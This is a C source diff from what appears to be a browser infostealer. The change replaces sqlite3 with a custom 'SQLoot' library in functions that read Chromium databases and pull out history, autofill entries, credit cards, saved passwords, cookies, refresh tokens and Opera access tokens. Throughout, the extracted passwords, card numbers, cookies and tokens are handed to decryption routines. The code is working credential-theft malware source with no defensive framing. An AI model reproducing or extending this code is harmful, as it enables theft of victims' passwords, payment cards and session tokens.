@@ -1,5 +1,5 @@
 #include "Headers.h"
-#include "sqlite3.h"
+#include "SQLoot.h"
 
 // ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
 
@@ -343,9 +343,9 @@ _END_OF_FUNC:
 
 BOOL ExtractHistoryFromDatabase(IN BROWSER_TYPE Browser, IN OUT PCHROMIUM_DATA pChromiumData)
 {
-    sqlite3*        pDb                     = NULL;
-    sqlite3_stmt*   pStmt                   = NULL;
-    INT             nSqliteResult           = SQLITE_OK;
+    PSQLOOT_DB      pDb                     = NULL;
+    PSQLOOT_STMT    pStmt                   = NULL;
+    INT             nSqliteResult           = SQLOOT_RESULT_OK;
     LPCSTR          szUrl                   = NULL;
     LPCSTR          szTitle                 = NULL;
     LPCSTR          pszHistoryDatabasePath  = NULL;
@@ -360,52 +360,50 @@ BOOL ExtractHistoryFromDatabase(IN BROWSER_TYPE Browser, IN OUT PCHROMIUM_DATA p
     if (!(pszHistoryDatabasePath = GetBrowserDataFilePath(Browser, szRelPath)))
         return FALSE;
 
-    if ((nSqliteResult = sqlite3_open_v2(pszHistoryDatabasePath, &pDb, SQLITE_OPEN_READONLY, NULL)) != SQLITE_OK)
+    if ((nSqliteResult = SQLootOpen(pszHistoryDatabasePath, &pDb, SQLOOT_OPEN_READONLY)) != SQLOOT_RESULT_OK)
     {
-        DBGA("[!] sqlite3_open_v2 Failed With Error: %d (%s)", nSqliteResult, sqlite3_errmsg(pDb));
+        DBGA("[!] SQLootOpen Failed With Error: %d (%s)", nSqliteResult, SQLootErrmsg(pDb));
         goto _END_OF_FUNC;
     }
 
-    if ((nSqliteResult = sqlite3_prepare_v2(pDb, SQLQUERY_HISTORY, -1, &pStmt, NULL)) != SQLITE_OK)
+    if ((nSqliteResult = SQLootPrepare(pDb, SQLQUERY_HISTORY, -1, &pStmt)) != SQLOOT_RESULT_OK)
     {
-        DBGA("[!] sqlite3_prepare_v2 Failed With Error: %d (%s)", nSqliteResult, sqlite3_errmsg(pDb));
+        DBGA("[!] SQLootPrepare Failed With Error: %d (%s)", nSqliteResult, SQLootErrmsg(pDb));
         goto _END_OF_FUNC;
     }
 
     DBGV("[+] Executing Query: %s", SQLQUERY_HISTORY);
 
-    while ((nSqliteResult = sqlite3_step(pStmt)) == SQLITE_ROW)
+    while ((nSqliteResult = SQLootStep(pStmt)) == SQLOOT_RESULT_ROW)
     {
-        szUrl           = (LPCSTR)sqlite3_column_text(pStmt, 0);
-        szTitle         = (LPCSTR)sqlite3_column_text(pStmt, 1);
-        dwVisitCount    = sqlite3_column_int(pStmt, 2);
-        llLastVisitTime = sqlite3_column_int64(pStmt, 3);
+        szUrl           = SQLootColumnText(pStmt, 0);
+        szTitle         = SQLootColumnText(pStmt, 1);
+        dwVisitCount    = SQLootColumnInt(pStmt, 2);
+        llLastVisitTime = SQLootColumnInt64(pStmt, 3);
 
         AddHistoryEntry(pChromiumData, szUrl, szTitle, dwVisitCount, llLastVisitTime);
     }
 
-    if (nSqliteResult != SQLITE_DONE)
+    if (nSqliteResult != SQLOOT_RESULT_DONE)
     {
-        DBGA("[!] sqlite3_step Failed With Error: %d (%s)", nSqliteResult, sqlite3_errmsg(pDb));
+        DBGA("[!] sqlite3_step Failed With Error: %d (%s)", nSqliteResult, SQLootErrmsg(pDb));
         goto _END_OF_FUNC;
     }
 
     bResult = TRUE;
 
 _END_OF_FUNC:
-    if (pStmt)
-        sqlite3_finalize(pStmt);
-    if (pDb)
-        sqlite3_close(pDb);
+    if (pStmt) SQLootFinalize(pStmt);
+    if (pDb) SQLootClose(pDb);
     HEAP_FREE(pszHistoryDatabasePath);
     return bResult;
 }
 
 BOOL ExtractAutofillFromDatabase(IN BROWSER_TYPE Browser, IN OUT PCHROMIUM_DATA pChromiumData)
 {
-    sqlite3*        pDb                     = NULL;
-    sqlite3_stmt*   pStmt                   = NULL;
-    INT             nSqliteResult           = SQLITE_OK;
+    PSQLOOT_DB      pDb                     = NULL;
+    PSQLOOT_STMT    pStmt                   = NULL;
+    INT             nSqliteResult           = SQLOOT_RESULT_OK;
     LPCSTR          szName                  = NULL;
     LPCSTR          szValue                 = NULL;
     LPCSTR          pszWebDatabasePath      = NULL;
@@ -420,52 +418,50 @@ BOOL ExtractAutofillFromDatabase(IN BROWSER_TYPE Browser, IN OUT PCHROMIUM_DATA 
     if (!(pszWebDatabasePath = GetBrowserDataFilePath(Browser, szRelPath)))
         return FALSE;
 
-    if ((nSqliteResult = sqlite3_open_v2(pszWebDatabasePath, &pDb, SQLITE_OPEN_READONLY, NULL)) != SQLITE_OK)
+    if ((nSqliteResult = SQLootOpen(pszWebDatabasePath, &pDb, SQLOOT_OPEN_READONLY)) != SQLOOT_RESULT_OK)
     {
-        DBGA("[!] sqlite3_open_v2 Failed With Error: %d (%s)", nSqliteResult, sqlite3_errmsg(pDb));
+        DBGA("[!] SQLootOpen Failed With Error: %d (%s)", nSqliteResult, SQLootErrmsg(pDb));
         goto _END_OF_FUNC;
     }
 
-    if ((nSqliteResult = sqlite3_prepare_v2(pDb, SQLQUERY_AUTOFILL, -1, &pStmt, NULL)) != SQLITE_OK)
+    if ((nSqliteResult = SQLootPrepare(pDb, SQLQUERY_AUTOFILL, -1, &pStmt)) != SQLOOT_RESULT_OK)
     {
-        DBGA("[!] sqlite3_prepare_v2 Failed With Error: %d (%s)", nSqliteResult, sqlite3_errmsg(pDb));
+        DBGA("[!] SQLootPrepare Failed With Error: %d (%s)", nSqliteResult, SQLootErrmsg(pDb));
         goto _END_OF_FUNC;
     }
 
     DBGV("[+] Executing Query: %s", SQLQUERY_AUTOFILL);
 
-    while ((nSqliteResult = sqlite3_step(pStmt)) == SQLITE_ROW)
+    while ((nSqliteResult = SQLootStep(pStmt)) == SQLOOT_RESULT_ROW)
     {
-        szName          = (LPCSTR)sqlite3_column_text(pStmt, 0);
-        szValue         = (LPCSTR)sqlite3_column_text(pStmt, 1);
-        llDateCreated   = sqlite3_column_int64(pStmt, 2);
-        dwCount         = sqlite3_column_int(pStmt, 3);
+        szName          = SQLootColumnText(pStmt, 0);
+        szValue         = SQLootColumnText(pStmt, 1);
+        llDateCreated   = SQLootColumnInt64(pStmt, 2);
+        dwCount         = SQLootColumnInt(pStmt, 3);
 
         AddAutofillEntry(pChromiumData, szName, szValue, llDateCreated, dwCount);
     }
 
-    if (nSqliteResult != SQLITE_DONE)
+    if (nSqliteResult != SQLOOT_RESULT_DONE)
     {
-        DBGA("[!] sqlite3_step Failed With Error: %d (%s)", nSqliteResult, sqlite3_errmsg(pDb));
+        DBGA("[!] SQLootStep Failed With Error: %d (%s)", nSqliteResult, SQLootErrmsg(pDb));
         goto _END_OF_FUNC;
     }
 
     bResult = TRUE;
 
 _END_OF_FUNC:
-    if (pStmt)
-        sqlite3_finalize(pStmt);
-    if (pDb)
-        sqlite3_close(pDb);
+    if (pStmt) SQLootFinalize(pStmt);
+    if (pDb) SQLootClose(pDb);
     HEAP_FREE(pszWebDatabasePath);
     return bResult;
 }
 
 BOOL ExtractCreditCardsFromDatabase(IN BROWSER_TYPE Browser, IN OUT PCHROMIUM_DATA pChromiumData)
 {
-    sqlite3*        pDb                         = NULL;
-    sqlite3_stmt*   pStmt                       = NULL;
-    INT             nSqliteResult               = SQLITE_OK;
+    PSQLOOT_DB      pDb                         = NULL;
+    PSQLOOT_STMT    pStmt                       = NULL;
+    INT             nSqliteResult               = SQLOOT_RESULT_OK;
     LPCSTR          szNameOnCard                = NULL;
     LPCSTR          szNickname                  = NULL;
     LPCSTR          pszWebDatabasePath          = NULL;
@@ -485,29 +481,29 @@ BOOL ExtractCreditCardsFromDatabase(IN BROWSER_TYPE Browser, IN OUT PCHROMIUM_DA
     if (!(pszWebDatabasePath = GetBrowserDataFilePath(Browser, szRelPath)))
         return FALSE;
 
-    if ((nSqliteResult = sqlite3_open_v2(pszWebDatabasePath, &pDb, SQLITE_OPEN_READONLY, NULL)) != SQLITE_OK)
+    if ((nSqliteResult = SQLootOpen(pszWebDatabasePath, &pDb, SQLOOT_OPEN_READONLY)) != SQLOOT_RESULT_OK)
     {
-        DBGA("[!] sqlite3_open_v2 Failed With Error: %d (%s)", nSqliteResult, sqlite3_errmsg(pDb));
+        DBGA("[!] SQLootOpen Failed With Error: %d (%s)", nSqliteResult, SQLootErrmsg(pDb));
         goto _END_OF_FUNC;
     }
 
-    if ((nSqliteResult = sqlite3_prepare_v2(pDb, SQLQUERY_CREDIT_CARDS, -1, &pStmt, NULL)) != SQLITE_OK)
+    if ((nSqliteResult = SQLootPrepare(pDb, SQLQUERY_CREDIT_CARDS, -1, &pStmt)) != SQLOOT_RESULT_OK)
     {
-        DBGA("[!] sqlite3_prepare_v2 Failed With Error: %d (%s)", nSqliteResult, sqlite3_errmsg(pDb));
+        DBGA("[!] SQLootPrepare Failed With Error: %d (%s)", nSqliteResult, SQLootErrmsg(pDb));
         goto _END_OF_FUNC;
     }
 
     DBGV("[+] Executing Query: %s", SQLQUERY_CREDIT_CARDS);
 
-    while ((nSqliteResult = sqlite3_step(pStmt)) == SQLITE_ROW)
+    while ((nSqliteResult = SQLootStep(pStmt)) == SQLOOT_RESULT_ROW)
     {
-        szNameOnCard                = (LPCSTR)sqlite3_column_text(pStmt, 0);
-        dwExpirationMonth           = sqlite3_column_int(pStmt, 1);
-        dwExpirationYear            = sqlite3_column_int(pStmt, 2);
-        pbEncryptedCardNumber       = (PBYTE)sqlite3_column_blob(pStmt, 3);
-        dwEncryptedCardNumberSize   = sqlite3_column_bytes(pStmt, 3);
-        szNickname                  = (LPCSTR)sqlite3_column_text(pStmt, 4);
-        llDateModified              = sqlite3_column_int64(pStmt, 5);
+        szNameOnCard                = SQLootColumnText(pStmt, 0);
+        dwExpirationMonth           = SQLootColumnInt(pStmt, 1);
+        dwExpirationYear            = SQLootColumnInt(pStmt, 2);
+        pbEncryptedCardNumber       = (PBYTE)SQLootColumnBlob(pStmt, 3);
+        dwEncryptedCardNumberSize   = SQLootColumnBytes(pStmt, 3);
+        szNickname                  = SQLootColumnText(pStmt, 4);
+        llDateModified              = SQLootColumnInt64(pStmt, 5);
 
         pbDecryptedCardNumber       = NULL;
         dwDecryptedCardNumberSize   = 0;
@@ -536,28 +532,26 @@ BOOL ExtractCreditCardsFromDatabase(IN BROWSER_TYPE Browser, IN OUT PCHROMIUM_DA
         }
     }
 
-    if (nSqliteResult != SQLITE_DONE)
+    if (nSqliteResult != SQLOOT_RESULT_DONE)
     {
-        DBGA("[!] sqlite3_step Failed With Error: %d (%s)", nSqliteResult, sqlite3_errmsg(pDb));
+        DBGA("[!] SQLootStep Failed With Error: %d (%s)", nSqliteResult, SQLootErrmsg(pDb));
         goto _END_OF_FUNC;
     }
 
     bResult = TRUE;
 
 _END_OF_FUNC:
-    if (pStmt)
-        sqlite3_finalize(pStmt);
-    if (pDb)
-        sqlite3_close(pDb);
+    if (pStmt) SQLootFinalize(pStmt);
+    if (pDb) SQLootClose(pDb);
     HEAP_FREE(pszWebDatabasePath);
     return bResult;
 }
 
 BOOL ExtractLoginsFromDatabase(IN BROWSER_TYPE Browser, IN OUT PCHROMIUM_DATA pChromiumData)
 {
-    sqlite3*        pDb                         = NULL;
-    sqlite3_stmt*   pStmt                       = NULL;
-    INT             nSqliteResult               = SQLITE_OK;
+    PSQLOOT_DB      pDb                         = NULL;
+    PSQLOOT_STMT    pStmt                       = NULL;
+    INT             nSqliteResult               = SQLOOT_RESULT_OK;
     LPCSTR          szOriginUrl                 = NULL;
     LPCSTR          szActionUrl                 = NULL;
     LPCSTR          szUsername                  = NULL;
@@ -577,29 +571,29 @@ BOOL ExtractLoginsFromDatabase(IN BROWSER_TYPE Browser, IN OUT PCHROMIUM_DATA pC
     if (!(pszLoginDatabasePath = GetBrowserDataFilePath(Browser, szRelPath)))
         return FALSE;
 
-    if ((nSqliteResult = sqlite3_open_v2(pszLoginDatabasePath, &pDb, SQLITE_OPEN_READONLY, NULL)) != SQLITE_OK)
+    if ((nSqliteResult = SQLootOpen(pszLoginDatabasePath, &pDb, SQLOOT_OPEN_READONLY)) != SQLOOT_RESULT_OK)
     {
-        DBGA("[!] sqlite3_open_v2 Failed With Error: %d (%s)", nSqliteResult, sqlite3_errmsg(pDb));
+        DBGA("[!] SQLootOpen Failed With Error: %d (%s)", nSqliteResult, SQLootErrmsg(pDb));
         goto _END_OF_FUNC;
     }
 
-    if ((nSqliteResult = sqlite3_prepare_v2(pDb, SQLQUERY_LOGINS, -1, &pStmt, NULL)) != SQLITE_OK)
+    if ((nSqliteResult = SQLootPrepare(pDb, SQLQUERY_LOGINS, -1, &pStmt)) != SQLOOT_RESULT_OK)
     {
-        DBGA("[!] sqlite3_prepare_v2 Failed With Error: %d (%s)", nSqliteResult, sqlite3_errmsg(pDb));
+        DBGA("[!] SQLootPrepare Failed With Error: %d (%s)", nSqliteResult, SQLootErrmsg(pDb));
         goto _END_OF_FUNC;
     }
 
     DBGV("[v] Executing Query: %s", SQLQUERY_LOGINS);
 
-    while ((nSqliteResult = sqlite3_step(pStmt)) == SQLITE_ROW)
+    while ((nSqliteResult = SQLootStep(pStmt)) == SQLOOT_RESULT_ROW)
     {
-        szOriginUrl             = (LPCSTR)sqlite3_column_text(pStmt, 0);
-        szActionUrl             = (LPCSTR)sqlite3_column_text(pStmt, 1);
-        szUsername              = (LPCSTR)sqlite3_column_text(pStmt, 2);
-        pbEncryptedPassword     = (PBYTE)sqlite3_column_blob(pStmt, 3);
-        dwEncryptedPasswordSize = sqlite3_column_bytes(pStmt, 3);
-        llDateCreated           = sqlite3_column_int64(pStmt, 4);
-        llDateLastUsed          = sqlite3_column_int64(pStmt, 5);
+        szOriginUrl             = SQLootColumnText(pStmt, 0);
+        szActionUrl             = SQLootColumnText(pStmt, 1);
+        szUsername              = SQLootColumnText(pStmt, 2);
+        pbEncryptedPassword     = (PBYTE)SQLootColumnBlob(pStmt, 3);
+        dwEncryptedPasswordSize = SQLootColumnBytes(pStmt, 3);
+        llDateCreated           = SQLootColumnInt64(pStmt, 4);
+        llDateLastUsed          = SQLootColumnInt64(pStmt, 5);
         pbDecryptedPassword     = NULL;
         dwDecryptedPasswordSize = 0x00;
 
@@ -626,28 +620,27 @@ BOOL ExtractLoginsFromDatabase(IN BROWSER_TYPE Browser, IN OUT PCHROMIUM_DATA pC
             }
         }
     }
-    if (nSqliteResult != SQLITE_DONE)
+
+    if (nSqliteResult != SQLOOT_RESULT_DONE)
     {
-        DBGA("[!] sqlite3_step Failed With Error: %d (%s)", nSqliteResult, sqlite3_errmsg(pDb));
+        DBGA("[!] SQLootStep Failed With Error: %d (%s)", nSqliteResult, SQLootErrmsg(pDb));
         goto _END_OF_FUNC;
     }
 
     bResult = TRUE;
 
 _END_OF_FUNC:
-    if (pStmt)
-        sqlite3_finalize(pStmt);
-    if (pDb)
-        sqlite3_close(pDb);
+    if (pStmt) SQLootFinalize(pStmt);
+    if (pDb) SQLootClose(pDb);
     HEAP_FREE(pszLoginDatabasePath);
     return bResult;
 }
 
 BOOL ExtractCookiesFromDatabase(IN BROWSER_TYPE Browser, IN OUT PCHROMIUM_DATA pChromiumData)
 {
-    sqlite3*        pDb                     = NULL;
-    sqlite3_stmt*   pStmt                   = NULL;
-    INT             nSqliteResult           = SQLITE_OK;
+    PSQLOOT_DB      pDb                     = NULL;
+    PSQLOOT_STMT    pStmt                   = NULL;
+    INT             nSqliteResult           = SQLOOT_RESULT_OK;
     LPCSTR          szHostKey               = NULL;
     LPCSTR          szPath                  = NULL;
     LPCSTR          szName                  = NULL;
@@ -666,28 +659,28 @@ BOOL ExtractCookiesFromDatabase(IN BROWSER_TYPE Browser, IN OUT PCHROMIUM_DATA p
     if (!(pszCookiesDatabasePath = GetBrowserDataFilePath(Browser, szRelPath)))
         return FALSE;
 
-    if ((nSqliteResult = sqlite3_open_v2(pszCookiesDatabasePath, &pDb, SQLITE_OPEN_READONLY, NULL)) != SQLITE_OK)
+    if ((nSqliteResult = SQLootOpen(pszCookiesDatabasePath, &pDb, SQLOOT_OPEN_READONLY)) != SQLOOT_RESULT_OK)
     {
-        DBGA("[!] sqlite3_open_v2 Failed With Error: %d (%s)", nSqliteResult, sqlite3_errmsg(pDb));
+        DBGA("[!] SQLootOpen Failed With Error: %d (%s)", nSqliteResult, SQLootErrmsg(pDb));
         goto _END_OF_FUNC;
     }
 
-    if ((nSqliteResult = sqlite3_prepare_v2(pDb, SQLQUERY_COOKIES, -1, &pStmt, NULL)) != SQLITE_OK)
+    if ((nSqliteResult = SQLootPrepare(pDb, SQLQUERY_COOKIES, -1, &pStmt)) != SQLOOT_RESULT_OK)
     {
-        DBGA("[!] sqlite3_prepare_v2 Failed With Error: %d (%s)", nSqliteResult, sqlite3_errmsg(pDb));
+        DBGA("[!] SQLootPrepare Failed With Error: %d (%s)", nSqliteResult, SQLootErrmsg(pDb));
         goto _END_OF_FUNC;
     }
 
     DBGV("[+] Executing Query: %s", SQLQUERY_COOKIES);
 
-    while ((nSqliteResult = sqlite3_step(pStmt)) == SQLITE_ROW)
+    while ((nSqliteResult = SQLootStep(pStmt)) == SQLOOT_RESULT_ROW)
     {
-        szHostKey               = (LPCSTR)sqlite3_column_text(pStmt, 0);
-        szPath                  = (LPCSTR)sqlite3_column_text(pStmt, 1);
-        szName                  = (LPCSTR)sqlite3_column_text(pStmt, 2);
-        llExpiresUtc            = sqlite3_column_int64(pStmt, 3);
-        pbEncryptedValue        = (PBYTE)sqlite3_column_blob(pStmt, 4);
-        dwEncryptedValueSize    = sqlite3_column_bytes(pStmt, 4);
+        szHostKey               = SQLootColumnText(pStmt, 0);
+        szPath                  = SQLootColumnText(pStmt, 1);
+        szName                  = SQLootColumnText(pStmt, 2);
+        llExpiresUtc            = SQLootColumnInt64(pStmt, 3);
+        pbEncryptedValue        = (PBYTE)SQLootColumnBlob(pStmt, 4);
+        dwEncryptedValueSize    = SQLootColumnBytes(pStmt, 4);
 
         pbDecryptedValue        = NULL;
         dwDecryptedValueSize    = 0;
@@ -727,20 +720,18 @@ BOOL ExtractCookiesFromDatabase(IN BROWSER_TYPE Browser, IN OUT PCHROMIUM_DATA p
             }
         }
     }
-
-    if (nSqliteResult != SQLITE_DONE)
+    
+    if (nSqliteResult != SQLOOT_RESULT_DONE)
     {
-        DBGA("[!] sqlite3_step Failed With Error: %d (%s)", nSqliteResult, sqlite3_errmsg(pDb));
+        DBGA("[!] SQLootStep Failed With Error: %d (%s)", nSqliteResult, SQLootErrmsg(pDb));
         goto _END_OF_FUNC;
     }
 
     bResult = TRUE;
 
 _END_OF_FUNC:
-    if (pStmt)
-        sqlite3_finalize(pStmt);
-    if (pDb)
-        sqlite3_close(pDb);
+    if (pStmt) SQLootFinalize(pStmt);
+    if (pDb) SQLootClose(pDb);
     HEAP_FREE(pszCookiesDatabasePath);
     return bResult;
 }
@@ -748,9 +739,9 @@ _END_OF_FUNC:
 // This Function Works On All Chromium Browsers But Opera (It Requires A Different Query)
 BOOL ExtractRefreshTokenFromDatabase(IN BROWSER_TYPE Browser, IN OUT PCHROMIUM_DATA pChromiumData)
 {
-    sqlite3*        pDb                     = NULL;
-    sqlite3_stmt*   pStmt                   = NULL;
-    INT             nSqliteResult           = SQLITE_OK;
+    PSQLOOT_DB      pDb                     = NULL;
+    PSQLOOT_STMT    pStmt                   = NULL;
+    INT             nSqliteResult           = SQLOOT_RESULT_OK;
     LPCSTR          szService               = NULL;
     LPCSTR          pszWebDatabasePath      = NULL;
     CHAR            szRelPath[MAX_PATH]     = { 0 };
@@ -768,27 +759,27 @@ BOOL ExtractRefreshTokenFromDatabase(IN BROWSER_TYPE Browser, IN OUT PCHROMIUM_D
     if (!(pszWebDatabasePath = GetBrowserDataFilePath(Browser, szRelPath)))
         return FALSE;
 
-    if ((nSqliteResult = sqlite3_open_v2(pszWebDatabasePath, &pDb, SQLITE_OPEN_READONLY, NULL)) != SQLITE_OK)
+    if ((nSqliteResult = SQLootOpen(pszWebDatabasePath, &pDb, SQLOOT_OPEN_READONLY)) != SQLOOT_RESULT_OK)
     {
-        DBGA("[!] sqlite3_open_v2 Failed With Error: %d (%s)", nSqliteResult, sqlite3_errmsg(pDb));
+        DBGA("[!] SQLootOpen Failed With Error: %d (%s)", nSqliteResult, SQLootErrmsg(pDb));
         goto _END_OF_FUNC;
     }
 
-    if ((nSqliteResult = sqlite3_prepare_v2(pDb, SQLQUERY_TOKEN_SERVICE, -1, &pStmt, NULL)) != SQLITE_OK)
+    if ((nSqliteResult = SQLootPrepare(pDb, SQLQUERY_TOKEN_SERVICE, -1, &pStmt)) != SQLOOT_RESULT_OK)
     {
-        DBGA("[!] sqlite3_prepare_v2 Failed With Error: %d (%s)", nSqliteResult, sqlite3_errmsg(pDb));
+        DBGA("[!] SQLootPrepare Failed With Error: %d (%s)", nSqliteResult, SQLootErrmsg(pDb));
         goto _END_OF_FUNC;
     }
 
     DBGV("[+] Executing Query: %s", SQLQUERY_TOKEN_SERVICE);
 
-    while ((nSqliteResult = sqlite3_step(pStmt)) == SQLITE_ROW)
+    while ((nSqliteResult = SQLootStep(pStmt)) == SQLOOT_RESULT_ROW)
     {
-        szService               = (LPCSTR)sqlite3_column_text(pStmt, 0);
-        pbEncryptedToken        = (PBYTE)sqlite3_column_blob(pStmt, 1);
-        dwEncryptedTokenSize    = sqlite3_column_bytes(pStmt, 1);
-        pbBindingKey            = (PBYTE)sqlite3_column_blob(pStmt, 2);
-        dwBindingKeySize        = sqlite3_column_bytes(pStmt, 2);
+        szService               = SQLootColumnText(pStmt, 0);
+        pbEncryptedToken        = (PBYTE)SQLootColumnBlob(pStmt, 1);
+        dwEncryptedTokenSize    = SQLootColumnBytes(pStmt, 1);
+        pbBindingKey            = (PBYTE)SQLootColumnBlob(pStmt, 2);
+        dwBindingKeySize        = SQLootColumnBytes(pStmt, 2);
 
         pbDecryptedToken        = NULL;
         dwDecryptedTokenSize    = 0;
@@ -819,31 +810,29 @@ BOOL ExtractRefreshTokenFromDatabase(IN BROWSER_TYPE Browser, IN OUT PCHROMIUM_D
         }
     }
 
-    if (nSqliteResult != SQLITE_DONE)
+    if (nSqliteResult != SQLOOT_RESULT_DONE)
     {
-        DBGA("[!] sqlite3_step Failed With Error: %d (%s)", nSqliteResult, sqlite3_errmsg(pDb));
+        DBGA("[!] SQLootStep Failed With Error: %d (%s)", nSqliteResult, SQLootErrmsg(pDb));
         goto _END_OF_FUNC;
     }
 
     bResult = TRUE;
 
 _END_OF_FUNC:
-    if (pStmt)
-        sqlite3_finalize(pStmt);
-    if (pDb)
-        sqlite3_close(pDb);
+    if (pStmt) SQLootFinalize(pStmt);
+    if (pDb) SQLootClose(pDb);
     HEAP_FREE(pszWebDatabasePath);
     return bResult;
 }
 
 BOOL ExtractOperaAccessTokensFromDatabase(IN BROWSER_TYPE Browser, IN OUT PCHROMIUM_DATA pChromiumData)
 {
-    sqlite3*        pDb                 = NULL;
-    sqlite3_stmt*   pStmt               = NULL;
-    LPSTR           pszWebDatabasePath  = NULL;
-    CHAR            szRelPath[MAX_PATH] = { 0 };
-    INT             nResult             = SQLITE_OK;
-    BOOL            bResult             = FALSE;
+    PSQLOOT_DB      pDb                     = NULL;
+    PSQLOOT_STMT    pStmt                   = NULL;
+    INT             nSqliteResult           = SQLOOT_RESULT_OK;
+    LPSTR           pszWebDatabasePath      = NULL;
+    CHAR            szRelPath[MAX_PATH]     = { 0 };
+    BOOL            bResult                 = FALSE;
 
     if (!GetChromiumBrowserFilePath(Browser, FILE_TYPE_WEB_DATA, szRelPath, MAX_PATH))
         return FALSE;
@@ -851,28 +840,27 @@ BOOL ExtractOperaAccessTokensFromDatabase(IN BROWSER_TYPE Browser, IN OUT PCHROM
     if (!(pszWebDatabasePath = GetBrowserDataFilePath(Browser, szRelPath)))
         return FALSE;
 
-
-    if ((nResult = sqlite3_open_v2(pszWebDatabasePath, &pDb, SQLITE_OPEN_READONLY, NULL)) != SQLITE_OK)
+    if ((nSqliteResult = SQLootOpen(pszWebDatabasePath, &pDb, SQLOOT_OPEN_READONLY)) != SQLOOT_RESULT_OK)
     {
-        DBGA("[!] sqlite3_open_v2 Failed With Error: %d (%s)", nResult, sqlite3_errmsg(pDb));
+        DBGA("[!] SQLootOpen Failed With Error: %d (%s)", nSqliteResult, SQLootErrmsg(pDb));
         goto _END_OF_FUNC;
     }
 
-    if ((nResult = sqlite3_prepare_v2(pDb, SQLQUERY_OPERA_ACCESS_TOKENS, -1, &pStmt, NULL)) != SQLITE_OK)
+    if ((nSqliteResult = SQLootPrepare(pDb, SQLQUERY_OPERA_ACCESS_TOKENS, -1, &pStmt)) != SQLOOT_RESULT_OK)
     {
-        DBGA("[!] sqlite3_prepare_v2 Failed With Error: %d (%s)", nResult, sqlite3_errmsg(pDb));
+        DBGA("[!] SQLootPrepare Failed With Error: %d (%s)", nSqliteResult, SQLootErrmsg(pDb));
         goto _END_OF_FUNC;
     }
 
     DBGV("[+] Executing Query: %s", SQLQUERY_OPERA_ACCESS_TOKENS);
 
-    while ((nResult = sqlite3_step(pStmt)) == SQLITE_ROW)
+    while ((nSqliteResult = SQLootStep(pStmt)) == SQLOOT_RESULT_ROW)
     {
         // All columns are Base64 encoded and v10 encrypted
-        LPCSTR  szClientNameB64     = (LPCSTR)sqlite3_column_text(pStmt, 0);
-        LPCSTR  szScopesB64         = (LPCSTR)sqlite3_column_text(pStmt, 1);
-        LPCSTR  szTokenB64          = (LPCSTR)sqlite3_column_text(pStmt, 2);
-        LPCSTR  szExpirationB64     = (LPCSTR)sqlite3_column_text(pStmt, 3);
+        LPCSTR  szClientNameB64     = SQLootColumnText(pStmt, 0);
+        LPCSTR  szScopesB64         = SQLootColumnText(pStmt, 1);
+        LPCSTR  szTokenB64          = SQLootColumnText(pStmt, 2);
+        LPCSTR  szExpirationB64     = SQLootColumnText(pStmt, 3);
 
         PBYTE   pbClientName        = NULL, pbToken             = NULL,
                 pbDecryptedName     = NULL, pbDecryptedToken    = NULL;
@@ -906,8 +894,8 @@ BOOL ExtractOperaAccessTokensFromDatabase(IN BROWSER_TYPE Browser, IN OUT PCHROM
     bResult = TRUE;
 
 _END_OF_FUNC:
-    if (pStmt) sqlite3_finalize(pStmt);
-    if (pDb) sqlite3_close(pDb);
+    if (pStmt) SQLootFinalize(pStmt);
+    if (pDb) SQLootClose(pDb);
     HEAP_FREE(pszWebDatabasePath);
     return bResult;
 }
